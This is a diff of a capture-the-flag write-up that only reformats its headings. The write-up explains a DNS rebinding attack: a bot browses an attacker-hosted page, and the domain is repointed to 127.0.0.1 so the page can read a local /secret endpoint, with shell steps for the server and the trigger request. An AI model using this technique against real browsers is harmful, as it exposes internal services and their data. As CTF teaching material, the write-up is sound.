@@ -7,7 +7,7 @@ Generally: browsers inherent weakness and susceptibility to DNS rebinding attack
 
 #### Exploitation
 
-Overview:
+**Overview**
 
 We were given a clue that Monkey will staty on visited page for 2 minutes. So to exploit it we need to:
 
@@ -21,13 +21,13 @@ additional DNS query (due to already expired TTL) to execute this line:
 `xhttp.open("GET", "http://x.mydomain.com:8080/secret", false);` and this time
 (after chainging DNS setting in between) the domain will resolve to `127.0.0.1`.
 
-Prerequisites:
+**Prerequisites**
 
  - server with public IP (for example AWS t2.nano instance with IP 4.3.2.1)
  - domain name pointing to above machine (for example x.mydomain.com) with low
    TTL value (60 sec)
 
-Prepare the server:
+**Server preparation**
 
 ```
 $ cat <<EOF > file.html
@@ -54,15 +54,15 @@ EOF
 
     $ python3 -m http.server --bind 0.0.0.0 8080
 
-Find prove of work string:
+**Finding prove of work**
 
     $ links https://www.google.com/?q=<6_chars_from_monkey_page>+md5
 
-Trigger Monkey to browse your `x.mydomain.com:8080/file.html`:
+**Triggering Monkey to browse your `x.mydomain.com:8080/file.html`**
 
     $ curl http://202.120.7.200/run.php -d 'task=<string_from_prove_of_work>&url=<your_url>'
 
-Change DNS setting:
+**Changing DNS setting**
 
 In AWS Route 53 change: `x.mydomain.com -> 127.0.0.1`
 
